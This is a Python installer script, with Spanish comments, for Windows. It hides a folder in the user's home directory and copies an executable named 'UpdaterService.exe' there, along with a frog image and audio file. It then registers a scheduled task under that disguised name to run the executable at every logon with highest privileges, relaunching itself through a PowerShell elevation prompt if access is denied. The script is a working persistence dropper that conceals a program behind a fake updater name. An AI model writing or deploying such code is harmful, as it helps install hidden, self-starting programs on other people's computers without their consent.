import os
import shutil
import subprocess

# Obtener el directorio del usuario y crear la rutas
directorio_usuario = os.path.expanduser("~")
ruta_ansel = os.path.join(directorio_usuario, "ansel")
ruta_destino_exe = os.path.join(ruta_ansel, "UpdaterService.exe")
ruta_detino_imagen = os.path.join(ruta_ansel, "frog.jpg")
ruta_destino_audio = os.path.join(ruta_ansel, "frog.mp3")
ruta_exe = os.path.join(os.path.dirname(os.path.abspath(__file__)), "UpdaterService.exe")
ruta_imagen = os.path.join(os.path.dirname(os.path.abspath(__file__)), "frog.jpg")
ruta_audio = os.path.join(os.path.dirname(os.path.abspath(__file__)), "frog.mp3")
tarea = "UpdaterService"

# Función para ejecutar el script actual con permisos de administrador
def ejecutar_como_administrador():
    """Ejecuta el script actual con permisos de administrador."""
    if os.name == 'nt':
        try:
            script = f'Start-Process python -ArgumentList "{__file__}" -Verb RunAs'
            subprocess.run(["powershell", "-Command", script], check=True)
        except subprocess.CalledProcessError as e:
            print(f"Error al intentar ejecutar como administrador: {e}")

# Función para crear una carpeta oculta
def crear_carpeta_oculta(ruta_ansel):
    if not os.path.exists(ruta_ansel):
        try:
            os.makedirs(ruta_ansel)
            os.system(f'attrib +h "{ruta_ansel}"')
            print(f"Carpeta '{ruta_ansel}' creada y oculta.")
        except Exception as e:
            print(f"Error al crear la carpeta oculta: {e}")
    else:
        print(f"Carpeta '{ruta_ansel}' ya existe.")

# Función para copiar
def copiar(ruta_origen, ruta_destino):
    try:
        shutil.copy2(ruta_origen, ruta_destino)
        print(f"Copiado a {ruta_destino}")
    except FileNotFoundError:
        print(f"Error: no se encontró el archivo en la ruta origen: {ruta_origen}")
    except Exception as e:
        print(f"Error al copiar el archivo: {e}")

# Función para verificar si la tarea programada ya existe
def verificar_tarea_programada(tarea):
    try:
        comando = f'schtasks /query /tn "{tarea}"'
        resultado = subprocess.run(comando, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(f"Tarea '{tarea}' ya existe.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"Tarea '{tarea}' no encontrada.")
        return False

# Función para agregar la tarea programada si no existe
def agregar_tarea_programada(tarea, ruta_programa):
    if not verificar_tarea_programada(tarea):
        try:
            comando = f'schtasks /create /tn "{tarea}" /tr "{ruta_programa}" /sc onlogon /rl highest'
            resultado = subprocess.run(comando, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            print(resultado.stdout.decode('utf-8'))
            print(f"Tarea '{tarea}' añadida exitosamente.")
        except subprocess.CalledProcessError as e:
            print(f"Error al intentar agregar la tarea '{tarea}': {e.stderr.decode('utf-8')}")
            if "Acceso denegado" in e.stderr.decode('utf-8'):
                print("Se requiere permiso de administrador para crear la tarea.")
                ejecutar_como_administrador()

# Función para ejecutar UpdaterService desde la carpeta oculta ansel
#def ejecutar_updater_service():
#    try:
#        comando = f'start "" "{ruta_destino}"'
#        resultado = subprocess.run(comando, shell=True, check=True, capture_output=True, text=True)
#        print(f"UpdaterService se ejecutó correctamente desde {ruta_destino}")
#        print(f"Salida del programa: {resultado.stdout}")
#    except subprocess.CalledProcessError as e:
#        print(f"Error al ejecutar UpdaterService: {e}")
#        print(f"Salida de error: {e.stderr}")
#    except Exception as e:
#        print(f"Error inesperado al ejecutar UpdaterService: {e}")

crear_carpeta_oculta(ruta_ansel)
copiar(ruta_exe, ruta_destino_exe)
copiar(ruta_imagen, ruta_detino_imagen)
copiar(ruta_audio, ruta_destino_audio)
agregar_tarea_programada(tarea, ruta_destino_exe)
#ejecutar_updater_service()